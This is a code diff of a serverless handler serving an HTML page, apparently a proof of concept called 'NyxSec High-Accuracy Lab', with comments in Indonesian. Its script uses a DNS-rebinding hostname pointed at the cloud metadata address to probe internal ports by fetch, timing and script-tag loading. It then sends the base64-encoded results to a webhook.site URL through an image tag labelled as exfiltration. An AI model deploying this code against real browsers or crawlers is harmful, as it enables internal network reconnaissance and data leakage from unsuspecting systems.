@@ -2,53 +2,90 @@ export default function handler(req, res) {
   res.setHeader('Content-Type', 'text/html');
   res.status(200).send(`
     <html>
-      <head><title>NyxSec High-Precision Lab</title></head>
+      <head><title>NyxSec High-Accuracy Lab</title></head>
       <body>
-        <pre>Status: Executing Comprehensive Media-Stream Probing...</pre>
+        <h1 id="status">Initializing Triple-Protocol...</h1>
+        <div id="logs" style="font-family:monospace; font-size:10px;"></div>
         <script>
           const webhook = "https://webhook.site/0a66617e-3159-4804-9229-84d7010ec66d";
           const rebindBase = "01010101.a9fea9fe.rbndr.us";
+          
+          // Helper untuk mencatat aktivitas di layar agar Lighthouse tidak NO_FCP
+          function log(msg) {
+            document.getElementById('logs').innerHTML += "> " + msg + "<br>";
+            console.log(msg);
+          }
 
-          async function mediaProbe(port) {
+          async function comprehensiveProbe(port) {
+            log("Probing Port: " + port);
             const start = Date.now();
+            const report = { port, fetchError: null, timing: 0, tagStatus: null };
+
+            // 1. Fetch API (PNA/CORS Check)
+            try {
+              await fetch("http://" + rebindBase + ":" + port + "/nyxsec", { 
+                mode: 'no-cors', 
+                cache: 'no-cache',
+                priority: 'high'
+              });
+              report.tagStatus = "Fetch Initiated";
+            } catch (e) {
+              report.fetchError = e.message;
+            }
+
+            // 2. Resource Timing (Micro-precision)
+            const entries = performance.getEntriesByName("http://" + rebindBase + ":" + port + "/nyxsec");
+            report.timing = entries.length > 0 ? entries[0].duration : (Date.now() - start);
+
+            // 3. Script-Tag Probing (Logic Validation)
             return new Promise((resolve) => {
-              const video = document.createElement('video');
-              
-              // Timeout 5 detik: Batas krusial untuk membedakan Drop vs Reject
+              const script = document.createElement('script');
               const timer = setTimeout(() => {
-                video.src = ""; // Stop loading
-                resolve({ port, time: Date.now() - start, status: "timeout" });
-              }, 5000);
+                report.tagStatus = "Timeout";
+                resolve(report);
+              }, 4000); // Timeout lebih pendek agar tidak hang
 
-              video.onprogress = video.onsuspend = () => {
+              script.onerror = () => {
                 clearTimeout(timer);
-                resolve({ port, time: Date.now() - start, status: "interaction_detected" });
+                report.tagStatus = "Error/Blocked";
+                resolve(report);
+              };
+              
+              script.onload = () => {
+                clearTimeout(timer);
+                report.tagStatus = "Success";
+                resolve(report);
               };
 
-              video.onerror = () => {
-                clearTimeout(timer);
-                resolve({ port, time: Date.now() - start, status: "error" });
-              };
-
-              // Cache-busting unik untuk setiap port
-              video.src = "http://" + rebindBase + ":" + port + "/stream?v=" + Math.random();
-              video.load();
+              script.src = "http://" + rebindBase + ":" + port + "/poc.js?v=" + Math.random();
+              document.body.appendChild(script);
             });
           }
 
           async function runProtocol() {
-            const results = [];
-            // Daftar port untuk validasi silang:
-            // 9000, 9090: Port anomali sebelumnya
-            // 80: Port standar (Baseline 1)
-            // 12345, 54321, 65535: Port "pasti mati" (Baseline 2)
-            const targetPorts = [9000, 9090, 80, 12345, 54321, 65535];
+            // Ditambahkan port baseline (12345, 54321) untuk validasi akurat
+            const targets = [9000, 9090, 80, 12345, 54321]; 
+            const finalResults = [];
 
-            for (const p of targetPorts) {
-              results.push(await mediaProbe(p));
+            // Kirim "Ping" awal untuk memastikan webhook aktif
+            new Image().src = webhook + "?status=start&id=haza-0xa";
+
+            for(const p of targets) {
+              const res = await comprehensiveProbe(p);
+              finalResults.push(res);
             }
 
-            fetch(webhook + "?final_validation=" + btoa(JSON.stringify(results)));
+            log("All probes finished. Sending data...");
+            document.getElementById('status').innerText = "Scan Complete.";
+
+            // METODE EXFILTRASI TERKUAT: Gunakan Image Tag untuk mengirim Base64
+            // Ini jauh lebih handal daripada fetch() di lingkungan sandboxed
+            const b64Data = btoa(JSON.stringify(finalResults));
+            const exfil = new Image();
+            exfil.src = webhook + "?comprehensive=" + b64Data;
+            
+            // Berikan waktu bagi peramban untuk mengirim request sebelum halaman ditutup
+            setTimeout(() => { log("Finished."); }, 2000);
           }
 
           runProtocol();
